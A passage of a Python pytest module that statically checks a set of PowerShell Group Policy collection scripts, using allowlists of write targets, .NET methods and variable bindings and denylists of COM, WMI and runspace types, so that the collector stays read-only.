                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$entry.Open()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$stream.Write($inventoryBytes, 0, $inventoryBytes.Length)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "try",
            ),
        ),
    ),
    "GpoLensCollectionMarker.ps1": (
        (
            "& stat -L --format=%h -- $opened 2>$null",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                "guard if (-not (Test-Path -LiteralPath $opened)) -> throw",
            ),
        ),
        (
            (
                "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
                "[IO.FileShare]::Read)"
            ),
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
            ),
        ),
        (
            "$stream.CopyTo($bytes)",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
                "try",
            ),
        ),
        (
            "[IO.File]::Delete($marker)",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            (
                "[IO.File]::Open($marker, [IO.FileMode]::CreateNew, [IO.FileAccess]::Write, "
                "[IO.FileShare]::None)"
            ),
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "$stream.Write($Bytes, 0, $Bytes.Length)",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
            ),
        ),
    ),
    "Register-GpoLensCollection.ps1": (
        (
            ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            (),
        ),
        (
            "New-Item -ItemType Directory -Path $OutputRoot -Force",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "& $RegisterTask",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "if ($Unregister) after []",
                "if ($PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')) after []",
            ),
        ),
        (
            "Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "if ($GmsaAccount) after []",
            ),
        ),
        (
            (
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
                "$ServiceAccount -Password $taskPassword -Force"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "else of [($GmsaAccount)]",
            ),
        ),
        (
            (
                "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "[IO.File]::Delete($marker)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "catch []",
                "else of [($null -ne $previousBytes)]",
            ),
        ),
    ),
}

# Variable qualifiers a binding may carry. `$global:` leaks to the caller's
# session; a drive (`${alias:Get-Item}`, `$env:PSModulePath`, `${function:x}`,
# `${variable:x}`, `${C:\file}` — a file write) is a provider write.
_ALLOWED_QUALIFIERS = frozenset({"", "script", "local", "private"})

# PowerShell common parameters that WRITE a named variable; an allowlisted read
# command can thereby rebind a pinned path/exec variable (Sol BL-1). Rejected
# outright (names, their unambiguous prefixes, and the -ov/-pv/... aliases).
_VARIABLE_WRITING_PARAMS = frozenset(
    {"OutVariable", "PipelineVariable", "ErrorVariable", "WarningVariable", "InformationVariable"}
)
_VARIABLE_PARAM_TOKENS = frozenset(
    {"ov", "pv", "ev", "wv", "iv"}
    | {name[:i].casefold() for name in _VARIABLE_WRITING_PARAMS for i in range(3, len(name) + 1)}
)

# Instance methods that cause an external side effect (file/AD/registry/object
# mutation or a stream open/write). These require a receiver that is an
# allowlisted, pinned variable; a parenthesized/command receiver (receiver_var
# null) is rejected (Sol BL-2). Pure read/string/collection methods do not.
_SIDE_EFFECTING_METHODS = frozenset(
    {
        "Delete",
        "Open",
        "OpenWrite",
        "OpenRead",
        "Create",
        "CreateEntry",
        "CreateSubdirectory",
        "Write",
        "WriteByte",
        "WriteLine",
        "CopyTo",
        "MoveTo",
        "Replace",
        "SetInfo",
        "CommitChanges",
        "Put",
        "PutEx",
        "Save",
        "SetValue",
        "DeleteValue",
        "InvokeSet",
    }
)

# A pinned root may legitimately be bound by a `foreach ($v in ...)` loop only
# where the real script does so (Run iterates `$archive` over the expired
# exports). Any other foreach binding of a pinned root is a rebind (DeepSeek
# NEW-BL-2), as is a `foreach` whose source carries an absolute/UNC/provider
# path.
FOREACH_ALLOWED_ROOTS: dict[str, frozenset[str]] = {
    "Run-GpoLensCollection.ps1": frozenset({"archive"}),
}
# PowerShell scope prefixes stripped before a pinned-variable lookup, so
# `$script:OutputRoot` / `$global:OutputRoot` cannot dodge the pin (NEW-BL-2).
_SCOPE_PREFIXES = ("script:", "global:", "local:", "private:", "using:", "variable:")

# Every write-path argument must be exactly one of these pinned expressions per
# script (normalized). No free child data: `Join-Path $root $segment`, a
# `$env:` component, a literal/computed `..`, or `New-Item -Name` are not in the
# set and fail (Sol BL-4).
WRITE_TARGET_EXPRESSIONS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset(
        {
            "$OutputRoot",
            "$archive",
            "$dest",
            "$testFile",
            '(Join-Path $out "reports\\${safe}__$($gpo.Id).xml")',
            "(Join-Path $out 'AllGPOs.xml')",
            "(Join-Path $out 'collection-errors.json')",
            "(Join-Path $out 'gp-inheritance.json')",
            "(Join-Path $out 'gpo-inventory.json')",
            "(Join-Path $out 'gpo-metadata.json')",
            "(Join-Path $out 'group-members.json')",
            "(Join-Path $out 'ou-tree.json')",
            "(Join-Path $out 'principals.json')",
            "(Join-Path $out 'reports')",
            "(Join-Path $out 'sites.json')",
            "(Join-Path $out 'wmi-filters.json')",
        }
    ),
    "Export-GroupMembers.ps1": frozenset({"$OutputPath"}),
    "Export-Principals.ps1": frozenset({"$OutputPath"}),
    "Run-GpoLensCollection.ps1": frozenset(
        {
            "$CopyTo",
            "$LogPath",
            "$archive.FullName",
            "$delivery",
            "$folder",
            "$newest.FullName",
            "$next",
            "$old",
            "$partial",
            "(Join-Path $OutputRoot 'collection.lock')",
            "(Join-Path $exportDir 'gpo-inventory.json')",
        }
    ),
    "GpoLensCollectionMarker.ps1": frozenset({"$Marker", "$marker"}),
    "Register-GpoLensCollection.ps1": frozenset(
        {"$OutputRoot", "$marker", "(Join-Path $OutputRoot 'collection.lock')"}
    ),
}

# .NET type names (casefolded substrings) that are an AD/COM/WMI/runspace write
# or code-load surface. Rejected wherever they appear (cast, type literal,
# `using`), because such a receiver carries a write under an allowlisted
# instance-method name.
_FORBIDDEN_TYPE_SUBSTRINGS = (
    "adsi",
    "adsisearcher",
    "directoryservices",
    "directoryentry",
    "directorysearcher",
    "wscript",
    "comobject",
    "__comobject",
    "runspace",
    "powershell",
    "scriptblock",
    "wmi",
    "wmiclass",
    "wmisearcher",
    "cimsession",
    "cimclass",
    "ciminstance",
    "managementobject",
    "managementclass",
)

# File-writing commands and the bound parameters that name what they write.
# Move-Item removes its source, so both ends are write targets.
_WRITE_COMMANDS: dict[str, tuple[str, ...]] = {
    "Add-Content": ("Path", "LiteralPath"),
    "Copy-Item": ("Destination",),
    "Move-Item": ("Path", "LiteralPath", "Destination"),
    "New-Item": ("Path",),
    "Out-File": ("FilePath", "LiteralPath"),
    "Remove-Item": ("Path", "LiteralPath"),
    "Rename-Item": ("Path", "LiteralPath"),
    "Set-Content": ("Path", "LiteralPath"),
    "Tee-Object": ("FilePath", "LiteralPath"),
}
# Commands that write only when a path parameter is supplied (Get-GPOReport
# returns a string unless -Path is given — Sol get_gporeport).
_OPTIONAL_PATH_COMMANDS: dict[str, tuple[str, ...]] = {
    "Get-GPOReport": ("Path",),
}
# Static methods whose first argument is a path that may be created/written/deleted.
_WRITE_STATIC = {
    "IO.File::AppendAllText",
    "IO.File::Delete",
    "IO.File::Open",
    "IO.File::WriteAllBytes",
    "IO.File::WriteAllText",
    "IO.Compression.ZipFile::Open",
}
# New-Item item types that create a filesystem object other than a plain file or
# directory (a symlink/junction to SYSVOL re-points a confined root — Sol
# set_itemtype).
_FORBIDDEN_ITEM_TYPES = {"symboliclink", "junction", "hardlink"}
# A variable reference in source text: `$name`, `$scope:name`, `$drive:name` or
# `${...}`. Scope prefixes are stripped by _bare_var; a drive (env:) is kept.
_VARIABLE = re.compile(r"\$(?:\{([^}]+)\}|((?:[A-Za-z_][A-Za-z0-9_]*:)?[A-Za-z_][A-Za-z0-9_]*))")
# In a write TARGET (built from roots) any drive-qualified or UNC or `..` literal
# is illegitimate, including a single drive letter.
_ABSOLUTE_LITERAL = re.compile(r"[A-Za-z]:[\\/]|\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")
# A non-filesystem PowerShell provider qualifier (registry, cert, AD, env, ...).
_PROVIDER = re.compile(
    r"\b(?:HKLM|HKCU|HKCR|HKU|HKEY_[A-Z_]+|Cert|WSMan|Env|Variable|Function|Alias|AD):",
    re.IGNORECASE,
)
# In a parameter default or foreach source an absolute *filesystem* path is fine
# (it is the root itself); only UNC, a provider, or `..` are rejected.
_UNC_OR_DOTDOT = re.compile(r"\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")


def _cf(name: str) -> str:
    return name.casefold()


def _bare_var(name: str) -> str:
    """Casefold a variable name with any scope prefix stripped.

    ``$script:OutputRoot`` -> ``outputroot`` so a scoped assignment cannot dodge
    the pinned-variable lookup (DeepSeek NEW-BL-2).
    """
    cf = _cf(name)
    for prefix in _SCOPE_PREFIXES:
        if cf.startswith(prefix):
            return cf[len(prefix) :]
    return cf


def _vars_in(text: str | None) -> set[str]:
    return {_bare_var(a or b) for a, b in _VARIABLE.findall(text or "")}


def _normalize_type(name: str) -> str:
    return name.removeprefix("System.")


# ---------------------------------------------------------------------------
# Variable bindings (round-3 BL-2 / NEW-BL-1 / NEW-BL-3). Every way a variable
# can acquire a value is reduced to a binding key string:
#   "= <rhs>" / "+= <rhs>" ...   assignment (any operator)
#   "param" / "param <default>"  parameter declaration
#   "foreach <source>"           foreach loop variable
#   "ref <call>"                 [ref]$v handed to a call that may write it
#   "incdec <op>"                ++/--
#   "multi <rhs>"                $a, $b = ... (multiple assignment)
#   "arg <expr>"                 a local-function call site binds the parameter
#   "splat @<var>"               a splatted call may bind the parameter
#   "pipeline"                   a ValueFromPipeline parameter
#   "common -<Param>"            -OutVariable/-ErrorVariable/... writes it
#   "member <target> = <rhs>"    a property write on the variable's object
#   "index <target> = <rhs>"     an index write on the variable's object
# Names are merged per script (casefolded, scope prefix stripped), which over-
# approximates PowerShell's dynamic scoping: a binding anywhere counts.
# ---------------------------------------------------------------------------

_ASSIGN_OPERATORS = {
    "Equals": "=",
    "PlusEquals": "+=",
    "MinusEquals": "-=",
    "MultiplyEquals": "*=",
    "DivideEquals": "/=",
    "RemainderEquals": "%=",
    "QuestionQuestionEquals": "??=",
}
# PowerShell common parameters an advanced function accepts implicitly.
_COMMON_PARAMETERS = (
    "Debug",
    "ErrorAction",
    "ErrorVariable",
    "InformationAction",
    "InformationVariable",
    "OutBuffer",
    "OutVariable",
    "PipelineVariable",
    "ProgressAction",
    "Verbose",
    "WarningAction",
    "WarningVariable",
    "WhatIf",
    "Confirm",
)


def _binding_key(binding: dict[str, Any]) -> str:
    kind = binding["kind"]
    rhs = _norm(binding["rhs"])
    if kind == "assign":
        op = _ASSIGN_OPERATORS.get(binding["operator"], binding["operator"])
        return f"{op} {rhs}"
    if kind == "param":
        return f"param {rhs}".rstrip()
    if kind == "incdec":
        return f"incdec {binding['operator']}"
    return f"{kind} {rhs}".rstrip()


def _resolve_param(token: str, params: list[str]) -> str | None:
    """The parameter a `-token` binds to (exact name, else unique prefix)."""
    cf = _cf(token)
    exact = [p for p in params if _cf(p) == cf]
    if exact:
        return exact[0]
    prefixed = [p for p in params if _cf(p).startswith(cf)]
    return prefixed[0] if len(prefixed) == 1 else None


def _callable_functions(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, dict[str, Any]]:
    """casefolded name -> function_params record, for in-file and dot-sourced functions."""
    found: dict[str, dict[str, Any]] = {}
    for source in (script, *POLICIES[script].dot_sources):
        for fn in inv[source]["function_params"]:
            found[_cf(fn["name"])] = fn
    return found


def _call_site_bindings(
    script: str, inv: dict[str, dict[str, Any]]
) -> tuple[list[tuple[str, str]], list[str]]:
    """([(param, binding key)], [unresolvable call-site arguments])."""
    functions = _callable_functions(script, inv)
    bindings: list[tuple[str, str]] = []
    unresolved: list[str] = []
    for command in inv[script]["commands"]:
        fn = functions.get(_cf(command["name"] or ""))
        if fn is None:
            continue
        params: list[str] = list(fn["params"])
        explicit: set[str] = set()
        positional: list[str] = []
        splats: list[str] = []
        for arg in command["arguments"]:
            value = arg["value"]
            if arg["parameter"] is None:
                if arg["value_kind"] == "VariableExpressionAst" and str(value).startswith("@"):
                    splats.append(str(value))
                else:
                    positional.append(_norm(value))
                continue
            param = _resolve_param(str(arg["parameter"]), params)
            if param is None:
                if _resolve_param(str(arg["parameter"]), list(_COMMON_PARAMETERS)) is not None:
                    continue  # common parameter; variable-writing ones are checked separately
                unresolved.append(f"line {command['line']}: {command['name']} -{arg['parameter']}")
                continue
            explicit.add(param)
            bindings.append((param, f"arg {_norm(value)}" if value is not None else "arg switch"))
        free = [p for p in params if p not in explicit]
        for i, value in enumerate(positional):
            if i < len(free):
                bindings.append((free[i], f"arg {value}"))
            else:
                bindings.append(("args", f"arg {value}"))
        for splat in splats:
            for param in free:
                bindings.append((param, f"splat {splat}"))
        for param in fn["pipeline_params"]:
            bindings.append((param, "pipeline"))
    return bindings, unresolved


def _all_bindings(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, set[str]]:
    entry = inv[script]
    out: dict[str, set[str]] = {}

    def add(name: str, key: str) -> None:
        out.setdefault(_bare_var(name), set()).add(key)

    for binding in entry["variable_assignments"]:
        if _bare_var(binding["name"]) == "null":
            continue  # `$null = ...` discards output; it cannot rebind anything
        add(binding["name"], _binding_key(binding))
    params, _ = _call_site_bindings(script, inv)
    for param, key in params:
        add(param, key)
    for write in _common_param_writes(entry):
        add(write["target"], f"common -{write['parameter']}")
    for member in entry["member_assignments"]:
        if member["receiver_var"]:
            add(member["receiver_var"], f"member {_norm(member['target'])}")
    for index in entry["index_assignments"]:
        if index["root_var"]:
            add(index["root_var"], f"index {_norm(index['target'])}")
    return out


# Variables the engine sets that a pinned value may read without being pinned
# itself. None of them may be bound by the scripts (check_bindings refuses any
# binding of an automatic/preference variable that is not in SPECIAL_BINDINGS).
_AUTO_READ_OK = frozenset(
    {
        "_",
        "psitem",
        "true",
        "false",
        "null",
        "psscriptroot",
        "pscmdlet",
        "myinvocation",
        "pid",
        "lastexitcode",
        "matches",
        "env:systemroot",
    }
)


def _required_vars(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, str]:
    """Variables whose every binding must be pinned, with the first reason.

    Roots: write roots, variables in pinned write-target expressions, receivers
    of every instance-method call / property write / index write, splatted
    variables, variables in dynamic invocations and scheduled-task arguments,
    and dot-sourced function parameters pinned by their defining script. Then
    the closure: every variable read by any binding of a required variable.
    """
    entry = inv[script]
    reasons: dict[str, str] = {}

    def need(name: str | None, why: str) -> None:
        if not name:
            return
        bare = _bare_var(name)
        if bare not in reasons:
            reasons[bare] = why

    for root in WRITE_ROOTS[script]:
        need(root, "write root")
    for expr in sorted(WRITE_TARGET_EXPRESSIONS[script]):
        for var in sorted(_vars_in(expr)):
            need(var, f"write target {expr}")
    for member in entry["members"]:
        if not member["static"]:
            need(member["receiver_var"], f"receiver of .{member['member']}()")
    for member in entry["member_assignments"]:
        need(member["receiver_var"], f"property write {member['target']}")
    for index in entry["index_assignments"]:
        need(index["root_var"], f"index write {index['target']}")
    for ref in entry["variable_refs"]:
        if ref["splatted"]:
            need(ref["name"], "splatted")
    for command in entry["commands"]:
        if not command["name"]:
            for var in sorted(_vars_in(command["text"])):
                need(var, f"dynamic invocation {_norm(command['text'])}")
        elif command["name"] in TASK_ARG_VECTORS:
            for arg in command["arguments"]:
                for var in sorted(_vars_in(arg["value"])):
                    need(var, f"{command['name']} argument")
    for source in POLICIES[script].dot_sources:
        for fn in inv[source]["function_params"]:
            for param in fn["params"]:
                if _cf(param) in PINNED_VARS[source]:
                    need(param, f"parameter of {fn['name']} (pinned in {source})")
    bindings = _all_bindings(script, inv)
    pending = list(reasons)
    while pending:
        var = pending.pop()
        for key in sorted(bindings.get(var, set())):
            for ref in sorted(_vars_in(key)):
                if ref not in reasons:
                    reasons[ref] = f"read by a binding of ${var}"
                    pending.append(ref)
    return {var: why for var, why in reasons.items() if var not in _AUTO_READ_OK}


def _pwsh() -> str:
    exe = shutil.which("pwsh")
    if exe is None:
        if os.environ.get("CI"):
            pytest.fail("pwsh is required in CI for the collector read-only gate")
        pytest.skip("pwsh not installed; CI runs this gate (ubuntu runners ship pwsh)")
    return exe


def _run_dumper_raw(exe: str, paths: list[str], *flags: str, timeout: int = 120) -> Any:
    result = subprocess.run(
        [exe, "-NoProfile", "-NonInteractive", "-File", str(_DUMPER), *flags, *paths],
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
    assert result.returncode == 0, result.stderr
    return json.loads(result.stdout)


def _run_dumper(exe: str, paths: list[str]) -> dict[str, dict[str, Any]]:
    return {Path(entry["path"]).name: entry for entry in _run_dumper_raw(exe, paths)}


@cache
def _inventory_for(exe: str) -> dict[str, dict[str, Any]]:
    return _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])


@pytest.fixture(scope="module")
def inventory() -> dict[str, dict[str, Any]]:
    return _inventory_for(_pwsh())


def _exact(kind: str, script: str, used: set[str], allowed: frozenset[str]) -> None:
    unexpected = sorted(used - allowed)
    unused = sorted(allowed - used)
    assert not unexpected, f"{script}: {kind} outside the read-only allowlist: {unexpected}"
    assert not unused, f"{script}: stale {kind} allowlist entries (remove them): {unused}"


# ---------------------------------------------------------------------------
# Check functions. Each raises AssertionError on a violation. The per-script
# tests below call them against the real scripts; the regression suite calls
# run_all_checks against modified copies and asserts a failure.
# ---------------------------------------------------------------------------


def check_commands(script: str, entry: dict[str, Any], local: set[str]) -> None:
    policy = POLICIES[script]
    named = {c["name"] for c in entry["commands"] if c["name"]}
    _exact("commands", script, named - local, policy.commands)
    dynamic = {c["text"] for c in entry["commands"] if not c["name"]}
    _exact("dynamic invocations", script, dynamic, policy.dynamic_invocations)
    # Set-Variable / New-Variable / Set-Item / Tee-Object name a target in a
    # string the assignment AST cannot see; none are used, so forbid them.
    assert not entry["indirect_writes"], (
        f"{script}: indirect variable/item writes are not allowed: {entry['indirect_writes']}"
    )
    forbidden = sorted({_cf(n) for n in named} & {_cf(n) for n in FORBIDDEN_COMMANDS})
    assert not forbidden, f"{script}: commands that are never allowed: {forbidden}"
    # ForEach-Object may only run scriptblocks: `ForEach-Object Delete` /
    # `-MemberName Delete` invokes a method by name, invisible to the member
    # allowlist.
    for command in entry["commands"]:
        if _cf(command["name"] or "") not in ("foreach-object", "%", "foreach"):
            continue
        for arg in command["arguments"]:
            param = arg["parameter"]
            if param is None:
                ok = arg["value_kind"] == "ScriptBlockExpressionAst"
            else:
                resolved = _resolve_param(
                    str(param), ["Begin", "Process", "End", "RemainingScripts"]
                )
                ok = resolved is not None and arg["value_kind"] == "ScriptBlockExpressionAst"
            assert ok, (
                f"{script}:{command['line']}: ForEach-Object must be given scriptblocks only "
                f"({_norm(command['text'])})"
            )


def check_dotnet(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    members = entry["members"]
    dynamic = [m["text"] for m in members if m["dynamic_member"] or (m["static"] and not m["type"])]
    assert not dynamic, f"{script}: computed member/type names cannot be verified: {dynamic}"
    static = {f"{_normalize_type(m['type'])}::{m['member']}" for m in members if m["static"]}
    _exact("static .NET methods", script, static, policy.static_methods)
    instance = {m["member"] for m in members if not m["static"]}
    _exact("instance .NET methods", script, instance, policy.instance_methods)
    assigned = {a["target"] for a in entry["member_assignments"]}
    _exact("property assignments", script, assigned, policy.member_assignments)


def check_types(script: str, entry: dict[str, Any]) -> None:
    refs = list(entry["type_references"])
    for assignment in entry["member_assignments"]:
        refs += assignment.get("receiver_types", [])
    hits = sorted({t for t in refs if any(s in _cf(t) for s in _FORBIDDEN_TYPE_SUBSTRINGS)})
    assert not hits, f"{script}: forbidden .NET/COM/AD type reference: {hits}"


def check_instance_receivers(script: str, entry: dict[str, Any]) -> None:
    allowed = INSTANCE_RECEIVERS.get(script, {})
    for member in entry["members"]:
        if member["static"]:
            continue
        name = member["member"]
        receiver_var = member["receiver_var"]
        if receiver_var is None:
            # No pinnable receiver variable. A side-effecting method on a
            # parenthesized/command result ((Get-Item x).Delete(), FileInfo
            # .CopyTo, [WMI]...Delete()) is rejected; a pure read/string method
            # (e.g. ($_ | Out-String).TrimEnd()) is fine (type denylist already
            # screened any type-literal receiver).
            assert name not in _SIDE_EFFECTING_METHODS, (
                f"{script}:{member['line']}: side-effecting method {name!r} on a non-variable "
                f"receiver {member['receiver']!r} (needs a pinned receiver variable)"
            )
            continue
        permitted = allowed.get(name, frozenset())
        assert _cf(receiver_var) in permitted, (
            f"{script}:{member['line']}: instance method {name!r} called on unexpected receiver "
            f"${receiver_var} (allowed: {sorted(permitted)})"
        )


def _is_variable_param(param: str) -> bool:
    token = _cf(param)
    return token in _VARIABLE_PARAM_TOKENS or token.endswith("variable")


# A variable-writing common parameter must name its target as a plain literal
# identifier (optionally `+` for append). A computed name (`('Output'+'Root')`,
# `$n`, `${OutputRoot}`) cannot be pinned, so it is refused (DeepSeek NEW-BL-3,
# NON-BL-2).
_LITERAL_VARIABLE_NAME = re.compile(r"^\+?[A-Za-z_][A-Za-z0-9_]*$")


def _common_param_writes(entry: dict[str, Any]) -> list[dict[str, Any]]:
    """Every -OutVariable/-ErrorVariable/... use: line, parameter, target, literal.

    These bind a variable with no assignment AST node (Sol BL-1). ``literal`` is
    true only for a bare identifier argument; ``target`` is the variable name it
    writes (``+`` stripped) or the raw text when it is not literal.
    """
    writes: list[dict[str, Any]] = []
    for command in entry["commands"]:
        for arg in command["arguments"]:
            if arg["parameter"] and _is_variable_param(str(arg["parameter"])):
                raw = _norm(arg["value"])
                literal = arg["value_kind"] == "StringConstantExpressionAst" and bool(
                    _LITERAL_VARIABLE_NAME.match(raw)
                )
                writes.append(
                    {
                        "line": command["line"],
                        "parameter": str(arg["parameter"]),
                        "target": raw.lstrip("+") if literal else raw,
                        "literal": literal,
                    }
                )
    return writes


def check_usings(script: str, entry: dict[str, Any]) -> None:
    assert not entry["using_statements"], (
        f"{script}: `using` statements are not allowed "
        f"(assembly/module/namespace load): {[u['text'] for u in entry['using_statements']]}"
    )


def check_redirections(script: str, entry: dict[str, Any]) -> None:
    for redir in entry["redirections"]:
        if redir["kind"] == "merging":
            continue  # stream merge (e.g. *>&1); writes no file
        assert _norm(redir["location"]) == "$null", (
            f"{script}:{redir['line']}: file redirection must target $null, "
            f"not {redir['location']!r}"
        )


def check_new_object_and_add_type(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    types: set[str] = set()
    assemblies: set[str] = set()
    definitions: set[str] = set()
    for command in entry["commands"]:
        bound = command["bound"]
        if command["name"] == "New-Object":
            assert "ComObject" not in bound, f"{script}:{command['line']}: COM is not allowed"
            types.add(str(bound.get("TypeName")))
        elif command["name"] == "Add-Type":
            keys = set(bound) - {"ErrorAction"}
            if keys == {"AssemblyName"}:
                assemblies.add(bound["AssemblyName"])
            elif keys == {"TypeDefinition"} and command["type_definition_sha256"]:
                definitions.add(command["type_definition_sha256"])
            else:
                pytest.fail(f"{script}:{command['line']}: unsupported Add-Type form {sorted(keys)}")
    _exact("New-Object types", script, types, policy.new_object_types)
    _exact("Add-Type assemblies", script, assemblies, policy.add_type_assemblies)
    _exact("Add-Type inline definitions (sha256)", script, definitions, policy.add_type_definitions)


def _write_targets(entry: dict[str, Any]) -> list[tuple[int, str]]:
    targets: list[tuple[int, str]] = []
    for command in entry["commands"]:
        name = command["name"] or ""
        required = _WRITE_COMMANDS.get(name)
        optional = _OPTIONAL_PATH_COMMANDS.get(name)
        params = required or optional
        if params is None:
            continue
        bound = [command["bound"][p] for p in params if isinstance(command["bound"].get(p), str)]
        if not bound:
            if optional is not None:
                continue
            raise AssertionError(
                f"line {command['line']}: cannot resolve the write target of {command['text']}"
            )
        targets.extend((command["line"], text) for text in bound)
    for member in entry["members"]:
        if member["static"] and f"{_normalize_type(member['type'])}::{member['member']}" in (
            _WRITE_STATIC
        ):
            targets.append((member["line"], member["first_argument"] or ""))
    return targets


def check_writes(script: str, entry: dict[str, Any]) -> None:
    roots = set(WRITE_ROOTS[script])
    assert roots <= set(PINNED_VARS[script]), (
        f"{script}: every write root must be pinned: {roots - set(PINNED_VARS[script])}"
    )
    pinned_targets = WRITE_TARGET_EXPRESSIONS[script]
    used: set[str] = set()
    for line, text in _write_targets(entry):
        norm = _norm(text)
        # Closed set: the write target must be exactly one of the pinned path
        # expressions. This refuses `Join-Path $root $childData`, a `$env:` or
        # `..` component, and any computed child (Sol BL-4); the anchoring root
